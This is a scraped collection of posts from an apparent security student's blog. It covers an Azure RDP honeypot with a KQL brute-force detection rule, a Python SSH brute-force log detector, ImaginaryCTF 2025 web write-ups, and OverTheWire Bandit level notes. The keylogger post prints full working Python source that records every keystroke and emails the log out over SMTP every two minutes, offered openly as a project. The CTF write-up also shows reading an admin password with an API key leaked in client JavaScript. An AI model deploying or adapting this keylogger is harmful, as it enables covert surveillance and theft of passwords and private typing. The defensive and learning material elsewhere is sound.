items.title: 48 hours of Exposed RDP: What 60,000 Failed Logins Reveal About Real Attack Patterns
items.content_text:
Why I built this I wanted to know what attacks look like in the real world. Most of the practice I have stems from simulated labs on the internet in a closed environment. I wanted real data.
Specifically, I wanted to answer:
What does an exposed Windows server actually attract on the internet today? Which credentials are attackers actually trying? Can I capture and analyze enough real attacker telemetry to build production-grade detection rules? The short answer: yes, and the data is more interesting than I expected.
What I built (the architecture) The setup is intentionally simple - a single Windows Server 2022 VM in Azure, with RDP exposed to the public internet, forwarding Windows Security event logs to Microsoft Sentinel.
┌─────────────────────────────────────────┐│ Azure Subscription ││ (cloudshield-lab RG) ││ │Internet ───RDP──┼── ┌──────────────┐ │(attackers) │ │ cloudshield- │ ││ │ nsg (NSG) │ ││ │ ─ inbound: │ ││ │ 3389/TCP │ ││ │ ─ outbound: │ ││ │ deny ALL │ ││ │ except │ ││ │ Azure │ ││ │ services │ ││ └──────┬───────┘ ││ │ ││ ┌──────▼───────┐ ││ │ web-srv-02 │ ││ │ Win Srv 2025│ ││ │ B-series │ ││ │ │ ││ │ Audit policy│ ││ │ + AMA agent │ ││ └──────┬───────┘ ││ │ ││ ▼ (log shipping) ││ ┌──────────────┐ ││ │ Log Analytics│ ││ │ Workspace │ ││ └──────┬───────┘ ││ │ ││ ┌──────▼───────┐ ││ │ Microsoft │ ││ │ Sentinel │ ││ │ ─ Workbook │ ││ │ ─ Analytics │ ││ └──────────────┘ │└─────────────────────────────────────────┘ The egress controls Exposing a Windows Server to the internet without compensating controls is a liability. The default Azure NSG configuration allows all outbound internet traffic. For a normal VM, fine. For a honeypot, this means: if an attacker compromises your box, they can use it as a launchpad - cryptomining, command-and-control relay, outbound scanning, DDoS participation. Your subscription gets the abuse complaints and potentially the suspension.
I built the NSG with a default-deny outbound posture, with explicit allows only for the Azure service endpoints needed for log shipping: OUTBOUND
Priority 4000 is the safety net. Azure evaluates rules lowest-priority-number first, so 4000 runs before Azure’s default AllowInternetOutBound at priority 65001 - outbound internet is denied unless the traffic matches one of the specific Azure service allows above. I verified this end-to-end from inside the VM with Test-NetConnection:
powershellTest-NetConnection google.com -Port 44 #BLOCKEDTest-NetConnection pastebin.com -Port 443 #BLOCKEDTest-NetConnection global.handler.control.monitor.azure.com -Port 443 # ALLOWED The Data Across 48 hours of exposure, the honeypot captured:
804 failed authentication events (EventID 4625) 12 unique source IPs 9 countries of origin 4 distinct usernames attempted Most-attempted usernames
The top of the list is unsurprising - attackers run dictionaries that haven’t materially changed in years:
1. Administrator : 8042. web-srv-02 : 34 3. test : 324. administrator : 15 The interesting tail of this distribution is what attackers think might be on the box. Service-account-style usernames (backup, sql, ftp, vnc) suggest opportunistic guessing of common roles.
Attacks came from 9 countries. The top sources by volume were from european and asian countires. This is consistent with public threat intelligence: attack origin geography correlates more with hosting infrastructure availability than with attacker location. Cheap VPS providers, residential proxies, and compromised IoT devices in any country can become attack sources.
From data to detection rules Captured events without detections is a museum, not a security operation. The point of the exercise is to turn observed adversary behavior into rules that fire on it. I authored a detection rule for MITRE ATT&CK T1110 (Brute Force) in KQL (for Sentinel deployment):
KQL
SecurityEvent| where EventID == 4625| where isnotempty(IpAddress)| where IpAddress != "-"| where IpAddress !startswith "10." and IpAddress !startswith "192.168."| summarize FailedAttempts = count(), AttemptedUsernames = make_set (TargetUserName) by IpAddress, bin(TimeGenerated, 1h)| where FailedAttempts >= 5 What I am building next The honeypot generated raw IOCs (source IPs, usernames, behavioral patterns) but didn’t enrich them. The natural next phase is a Python pipeline that:
Pulls captured failed-logon data from Log Analytics via API Enriches each source IP against threat intel sources (AbuseIPDB, AlienVault OTX, MaxMind GeoIP). Clusters IPs by ASN to identify discrete attacker campaigns Outputs a ranked report of attacker personas This is the analytical layer above raw event capture - the work that turns a SIEM query into actionable threat intelligence. Writeup forthcoming.
Full project on GitHub: https://github.com/rajkive/cloudhshield---azure-RDP-honeypot-

Why I built this

I wanted to know what attacks look like in the real world. Most of the practice I have stems from simulated labs on the internet in a closed environment. I wanted real data.

Specifically, I wanted to answer:

  • What does an exposed Windows server actually attract on the internet today?
  • Which credentials are attackers actually trying?
  • Can I capture and analyze enough real attacker telemetry to build production-grade detection rules?

The short answer: yes, and the data is more interesting than I expected.

What I built (the architecture)

The setup is intentionally simple - a single Windows Server 2022 VM in Azure, with RDP exposed to the public internet, forwarding Windows Security event logs to Microsoft Sentinel.

                    ┌─────────────────────────────────────────┐
                    │           Azure Subscription            │
                    │         (cloudshield-lab RG)            │
                    │                                         │
   Internet ───RDP──┼──  ┌──────────────┐                     │
   (attackers)      │    │ cloudshield- │                     │
                    │    │ nsg (NSG)    │                     │
                    │    │  ─ inbound:  │                     │
                    │    │    3389/TCP  │                     │
                    │    │  ─ outbound: │                     │
                    │    │    deny ALL  │                     │
                    │    │    except    │                     │
                    │    │    Azure     │                     │
                    │    │    services  │                     │
                    │    └──────┬───────┘                     │
                    │           │                             │
                    │    ┌──────▼───────┐                     │
                    │    │  web-srv-02  │                     │
                    │    │  Win Srv 2025│                     │
                    │    │  B-series    │                     │
                    │    │              │                     │
                    │    │  Audit policy│                     │
                    │    │  + AMA agent │                     │
                    │    └──────┬───────┘                     │
                    │           │                             │
                    │           ▼ (log shipping)              │
                    │    ┌──────────────┐                     │
                    │    │ Log Analytics│                     │
                    │    │ Workspace    │                     │
                    │    └──────┬───────┘                     │
                    │           │                             │
                    │    ┌──────▼───────┐                     │
                    │    │  Microsoft   │                     │
                    │    │  Sentinel    │                     │
                    │    │  ─ Workbook  │                     │
                    │    │  ─ Analytics │                     │
                    │    └──────────────┘                     │
                    └─────────────────────────────────────────┘

The egress controls

Exposing a Windows Server to the internet without compensating controls is a liability. The default Azure NSG configuration allows all outbound internet traffic. For a normal VM, fine. For a honeypot, this means: if an attacker compromises your box, they can use it as a launchpad - cryptomining, command-and-control relay, outbound scanning, DDoS participation. Your subscription gets the abuse complaints and potentially the suspension.

I built the NSG with a default-deny outbound posture, with explicit allows only for the Azure service endpoints needed for log shipping: OUTBOUND

Priority 4000 is the safety net. Azure evaluates rules lowest-priority-number first, so 4000 runs before Azure’s default AllowInternetOutBound at priority 65001 - outbound internet is denied unless the traffic matches one of the specific Azure service allows above. I verified this end-to-end from inside the VM with Test-NetConnection:

powershell
Test-NetConnection google.com -Port 44    #BLOCKED
Test-NetConnection pastebin.com -Port 443 #BLOCKED
Test-NetConnection global.handler.control.monitor.azure.com -Port 443 # ALLOWED

The Data

Across 48 hours of exposure, the honeypot captured:

  • 804 failed authentication events (EventID 4625)
  • 12 unique source IPs
  • 9 countries of origin
  • 4 distinct usernames attempted

Most-attempted usernames

The top of the list is unsurprising - attackers run dictionaries that haven’t materially changed in years:

1. Administrator : 804
2. web-srv-02 : 34 
3. test : 32
4. administrator : 15

The interesting tail of this distribution is what attackers think might be on the box. Service-account-style usernames (backup, sql, ftp, vnc) suggest opportunistic guessing of common roles.

Attacks came from 9 countries. The top sources by volume were from european and asian countires. This is consistent with public threat intelligence: attack origin geography correlates more with hosting infrastructure availability than with attacker location. Cheap VPS providers, residential proxies, and compromised IoT devices in any country can become attack sources.

From data to detection rules

Captured events without detections is a museum, not a security operation. The point of the exercise is to turn observed adversary behavior into rules that fire on it. I authored a detection rule for MITRE ATT&CK T1110 (Brute Force) in KQL (for Sentinel deployment):

KQL

SecurityEvent
| where EventID == 4625
| where isnotempty(IpAddress)
| where IpAddress != "-"
| where IpAddress !startswith "10." and IpAddress !startswith "192.168."
| summarize FailedAttempts = count(), AttemptedUsernames = make_set (TargetUserName) by IpAddress, bin(TimeGenerated, 1h)
| where FailedAttempts >= 5

What I am building next

The honeypot generated raw IOCs (source IPs, usernames, behavioral patterns) but didn’t enrich them. The natural next phase is a Python pipeline that:

  • Pulls captured failed-logon data from Log Analytics via API Enriches each source IP against threat intel sources (AbuseIPDB, AlienVault OTX, MaxMind GeoIP).
  • Clusters IPs by ASN to identify discrete attacker campaigns
  • Outputs a ranked report of attacker personas

This is the analytical layer above raw event capture - the work that turns a SIEM query into actionable threat intelligence. Writeup forthcoming.

Full project on GitHub: https://github.com/rajkive/cloudhshield---azure-RDP-honeypot-

items.title: SSH Brute Force Detector - A beginner's guide
items.content_text:
SSH Brute-force Detector Even though it says ssh brute-force detector, I would say it is more like a simple pattern recognizer tool. I’ve been diving in to SOC work and one thing is clear, it is not just triaging the tickets. Automtion and Scripting is heavily used to make repetitive tasks easier, and also to make tasks like log analysis bearable. I came up with the idea when I was doing some log analysis exercise on LetsDefend, and as much as there are other tools available, it’s always better to know how to script to so you can make customizations.
Logic Flow This is a very basic script so there aren’t much steps to take. We mostly use regex pattern to identify/flag potential IPs and their count. We define a few things like whitelisted IPs, a threshold to define how many attempts are concerning, and a time window as typically brute-force attacks would spam a lot in less amount of time. The most important thing here is to define the base pattern which would typically involve the IP address and date + time. The pattern I came up after some googling is (\w+ +\d+ \d+:\d+:\d+).*from (\d+\.\d+\.\d+\.\d+)
Main Code Logic There is really no function to define, the logic is to open the log file, read each line, extract IP and date, time. See if it incldues “Failed Password” and then compare it against the threshold and time windwo defined. For my code, it will flag all the IPs which have more than 5 failed attempts in a specific time window.
THRESHOLD = 5WHITELIST = {"127.0.0.1", "192.168.1.1"}LOG_FILE = "Linux_2k.log"PATTERN = re.compile(r"(\w+ +\d+ \d+:\d+:\d+).*from (\d+\.\d+\.\d+\.\d+)")failed_attempts = defaultdict(list)blocked_ips = set()#logic for parsing and extracting IP and datetimewith open(LOG_FILE, "r") as f:for line in f:if "Failed password" not in line:continuematch = PATTERN.search(line)if not match:continuetimestamp_str = match.group(1)ip = match.group(2)timestamp = datetime.strptime(timestamp_str, "%b %d %H:%M:%S")timestamp = timestamp.replace(year=datetime.now().year)failed_attempts[ip].append(timestamp)for ip, timestamp in failed_attempts.items():if len(failed_attempts[ip]) >= THRESHOLD:if ip in WHITELIST:continueelif ip in blocked_ips:continueblocked_ips.add(ip) For full code you can check out my github
That’s really it for this project. The main objective was to familiarize myself with regex, file operations and basics of scripting. I would try to add more functionality maybe using powershell to see if I can integrate it with an actual program or firewall.

THRESHOLD = 5
WHITELIST = {"127.0.0.1", "192.168.1.1"}
LOG_FILE = "Linux_2k.log"
PATTERN = re.compile(r"(\w+ +\d+ \d+:\d+:\d+).*from (\d+\.\d+\.\d+\.\d+)")


failed_attempts = defaultdict(list)

#logic for parsing and extracting IP and datetime

        timestamp = datetime.strptime(timestamp_str, "%b %d %H:%M:%S")

        failed_attempts[ip].append(timestamp)
        
for ip, timestamp in failed_attempts.items():
    if len(failed_attempts[ip]) >= THRESHOLD:
        if ip in WHITELIST:
            continue
        elif ip in blocked_ips:
            continue
        
        blocked_ips.add(ip)

That’s really it for this project. The main objective was to familiarize myself with regex, file operations and basics of scripting. I would try to add more functionality maybe using powershell to see if I can integrate it with an actual program or firewall.

items.title: ImaginaryCTF 2025 Web Challenges Writeups
items.content_text:
Certificate This was probably one of the simpler challenges in the web category for this CTF. The goal was to extract the flag for the name Eth007 but the caveat was - every time you typed in that particular name. It would appear as REDACTED instead. tty The first thing I was to Inspect –> Sources and there I found that it was using a function to calculate the flag for each name. And if name was Eth007 it would replace it with REDACTED.
The solution to this challenge was simply calculating the customHash for the name Eth007 which came out to be d5e06bd5 so the flag was ictf{d5e06bd5}
Imaginary Notes This was a very fun challenge to solve and easy one as well. At first it did look a little deceiving at first but once I started looking around it did become more clear.
The flag was stored as a password in a supabase for admin. I did insptect –> sources and under app there was a js file where they left the link to the database along with the apikey. Once I saw that, the challenge was theoretically solved.
When I tried to access the link, it gave me an error that no apikey was attached in the header request. So I decided to use BurpSuite to capture the request and modify it. I just had to add the apikey and Authorization: Bearer in the request.
After forwarding the request, I had access to the database and I could very easily see the flag/password.

items.title: Keylogger in Python
items.content_text:
Keylogger in Python - A passion project (sort of) I tried my hands on making a keylogger, fully in python, and I learnt a lot! The inspiration behind this project is Grant Collin’s video on trying to make one. I followed his foot-steps for the structure but the implementation was purely from my thought process.
Link to the project: https://github.com/rajkive/py-key-logger
What is a Keylogger? A keylogger is a program that records every keystroke made on a keyboard. In this project, your keylogger will:
Capture keystrokes
Store them temporarily
Send them to your email every 120 seconds (2 minutes)
There are some pre-requisites for this project. Mainly these dependencies: pynput.keyboard, threading, smtplib, subprocess It is good to have some knowledge of the syntax and how they work but if not, then this is the perfect opportunity to get familiar with it.
The general flow for the program was fairly simple. Set-up email configurations -> Implement function to start capturing keystrokes -> Send logs via email -> using timer for repeated execution.
I tried to keep it simple and code the basic functionalities for each step. The only problem I encounterd was with smpt config for google. If you are using a gmail for this set-up there might be some problems with 2-factor auth or passkeys if the option is enabled. To debug it, I used a temp email for the reveiver and an Ethereal Email which create a free fake SMTP service for developers.
Overall this was a very fun project to do and took less than 2hrs. It was a good intro to lots of concepts essential for cyber and networking.
Code: import subprocess, smtplib, threadingfrom pynput.keyboard import Key, Listenersender_email = "sender-example@gmail.com"sender_password = "12345678"receiver_email = "example@gmail.com"open("log.txt", "a").close()def logging(key):try:log = key.charexcept AttributeError:if key == Key.space:log = ' 'elif key == Key.enter:log = '\n'elif key == Key.tab:log = '\t'else:log = f' [{key.name}] 'with open("log.txt", "a") as f:f.write(log)def send_mail():with open("log.txt", "r") as file:log_data = file.read()with smtplib.SMTP("smtp.gmail.com", 587) as server:server.starttls()server.login(sender_email, sender_password)server.sendmail(sender_email, receiver_email, loga_data)# clear the file after sending the emailwith open("log.txt", "w") as file:file.write("")threading.Timer(120, send_mail).start()send_mail()with Listener(on_press=logging) as listener:listener.join()

What is a Keylogger?

A keylogger is a program that records every keystroke made on a keyboard. In this project, your keylogger will:

  • Capture keystrokes

  • Store them temporarily

  • Send them to your email every 120 seconds (2 minutes)

There are some pre-requisites for this project. Mainly these dependencies: pynput.keyboard, threading, smtplib, subprocess It is good to have some knowledge of the syntax and how they work but if not, then this is the perfect opportunity to get familiar with it.

Code:

import subprocess, smtplib, threading
from pynput.keyboard import Key, Listener

sender_email = "sender-example@gmail.com"
sender_password = "12345678"
receiver_email = "example@gmail.com"
open("log.txt", "a").close()

def logging(key):
    try:
        log = key.char
    except AttributeError:
        if key == Key.space:
            log = ' '
        elif key == Key.enter:
            log = '\n'
        elif key == Key.tab:
            log = '\t'
        else:
            log = f' [{key.name}] '

    with open("log.txt", "a") as f:
        f.write(log)


def send_mail():
    with open("log.txt", "r") as file:
        log_data = file.read()
        
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, loga_data)
        

    # clear the file after sending the email
    with open("log.txt", "w") as file:
        file.write("")
    
    threading.Timer(120, send_mail).start()
    
send_mail()

with Listener(on_press=logging) as listener:
    listener.join()

items.title: Over the Wire Bandit
items.content_text:
One of the best resources that I’ve been recommended to learn linux commands is Over the Wire. It’s a gamified way to learn different concepts in cybersecurity, one such game is called bandit which primarily focuses on using different commands to find a text/flag which in our case is the password for next level.
In order to get started, I had to in through ssh with the format username@bandit.overthewire.org on port 2220.
Few things to know This is a simple write-up of levels from 0 to however many I can solve. I’m giving the answers through my thought process and there is always the case where there are different ways to approach the same question.
Before you start, there are few things you will need to know, first to use the man page for commands and their arguments. Second, some common commands and arguments to know:
cat: how view the content in the terminal ls -a : to view all the files in a directory, even the hidden ones cat ./ : use ./ when dealing with weird file names like “-” file : to know the file- type of a particular file Third, remember that you’re not supposed to know everything, that’s why research and search around, this way you will learn more!!!
Also don’t forget to keep their website open as they have the description of each level, without it you’ll be lost.
Level 0 –> Level 1 Here we simply had to use the cat command to display the text in the file, which contains the password for our next level.
Level 1 –> Level 2 Here, I first used the ls -l command to list all the files available, then comes the tricky part. The name of the file is a literal dash, the character “-”. As I mentioned earlier, when dealing with such files using the ./ is the best way to go ahead. The ./ simply means “Look in the current directory.” so the command was something like ./- and that’s it! We got the password for next level.
Level 2 –> Level 3 In the this level, we’re faced with another weird filename, it has spaces in it’s name and when you try it, the ./ command won’t work and the man page isn’t of much help either. This is where the “doing your own research” part comes in.
The answer is pretty simple, you need to use " " or double quotes.
Level 3 –> Level 4 This one was a bit tricky for me as you can see in the image. As usual I started using the ls -l command but it did not work, as it’s just a long listing format or in other words gives you the mode, number of links, owner, group, size (in bytes), and time of last modification for each file. But ls -a commands is the one which will show you all the files. And once you find what you are looking for, simply use the cat command followed by the filename.
Level 4 –> Level 5 Here they have given a very specific description that the flag is in a human-readable format/filetype only. What this usually means is that we need to find the file type which is in format of “ASCII” characters or text. file command is the way to go for this but there are lot’s of file and brute-forcing each one is time consuming and not efficient. Hence we need to parse through the entire directory and for that you need to use the ./* which means “in this directory for all”, this will give you an output that looks something like in the image below and you’ll have your answer
Level 5 –> Level 6 This one was a bit tricky as there are multiple ways to find the answer due to the specifications given in the documentation. The method which I used is using the grep method and searching by du and grep commands with some arguments. As it was given that it has a specific file size, I used du command to search by the file space with -a(all files and not just directories) and -b(bytes) with grep to find the pattern of 1033. And this how I got my answer.
Level 6 –> Level 7 Here, it’s kind of the same as the previous levels. Each file is owned by a user and a group. You can see what user and group owns a file with the ls command and its -l tag. To find the file, we will need to run the command from the root directory so we don’t miss anything. I used the command find / -type f -user bandit7 -group bandit6 -size 33c and with a little bit of scrolling, I got the answer.

items.content_html:
One of the best resources that I’ve been recommended to learn linux commands is Over the Wire. It’s a gamified way to learn different concepts in cybersecurity, one such game is called bandit which primarily focuses on using different commands to find a text/flag which in our case is the password for next level.

In order to get started, I had to in through ssh with the format username@bandit.overthewire.org on port 2220.

Few things to know

This is a simple write-up of levels from 0 to however many I can solve. I’m giving the answers through my thought process and there is always the case where there are different ways to approach the same question.

Before you start, there are few things you will need to know, first to use the man page for commands and their arguments. Second, some common commands and arguments to know:

  • cat: how view the content in the terminal
  • ls -a : to view all the files in a directory, even the hidden ones
  • cat ./ : use ./ when dealing with weird file names like “-”
  • file : to know the file- type of a particular file

Third, remember that you’re not supposed to know everything, that’s why research and search around, this way you will learn more!!!

Also don’t forget to keep their website open as they have the description of each level, without it you’ll be lost.

Level 0 –> Level 1

Here we simply had to use the cat command to display the text in the file, which contains the password for our next level.

Level 1 –> Level 2

Here, I first used the ls -l command to list all the files available, then comes the tricky part. The name of the file is a literal dash, the character “-”. As I mentioned earlier, when dealing with such files using the ./ is the best way to go ahead. The ./ simply means “Look in the current directory.” so the command was something like ./- and that’s it! We got the password for next level.

Level 2 –> Level 3

In the this level, we’re faced with another weird filename, it has spaces in it’s name and when you try it, the ./ command won’t work and the man page isn’t of much help either. This is where the “doing your own research” part comes in.

The answer is pretty simple, you need to use " " or double quotes.

Level 3 –> Level 4

This one was a bit tricky for me as you can see in the image. As usual I started using the ls -l command but it did not work, as it’s just a long listing format or in other words gives you the mode, number of links, owner, group, size (in bytes), and time of last modification for each file. But ls -a commands is the one which will show you all the files. And once you find what you are looking for, simply use the cat command followed by the filename.

Level 4 –> Level 5

Here they have given a very specific description that the flag is in a human-readable format/filetype only. What this usually means is that we need to find the file type which is in format of “ASCII” characters or text. file command is the way to go for this but there are lot’s of file and brute-forcing each one is time consuming and not efficient. Hence we need to parse through the entire directory and for that you need to use the ./* which means “in this directory for all”, this will give you an output that looks something like in the image below and you’ll have your answer

Level 5 –> Level 6

This one was a bit tricky as there are multiple ways to find the answer due to the specifications given in the documentation. The method which I used is using the grep method and searching by du and grep commands with some arguments. As it was given that it has a specific file size, I used du command to search by the file space with -a(all files and not just directories) and -b(bytes) with grep to find the pattern of 1033. And this how I got my answer.

Level 6 –> Level 7

Here, it’s kind of the same as the previous levels. Each file is owned by a user and a group. You can see what user and group owns a file with the ls command and its -l tag. To find the file, we will need to run the command from the root directory so we don’t miss anything. I used the command find / -type f -user bandit7 -group bandit6 -size 33c and with a little bit of scrolling, I got the answer.

bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c
find: ‘/var/cache/private’: Permission denied
find: ‘/var/cache/apparmor/2425d902.0’: Permission denied
find: ‘/var/cache/apparmor/baad73a1.0’: Permission denied
find: ‘/var/lib/polkit-1’: Permission denied
find: ‘/var/lib/amazon’: Permission denied
/var/lib/dpkg/info/bandit7.password

find: ‘/var/lib/chrony’: Permission denied
find: ‘/var/lib/snapd/void’: Permission denied

find: ‘/var/lib/private’: Permission denied
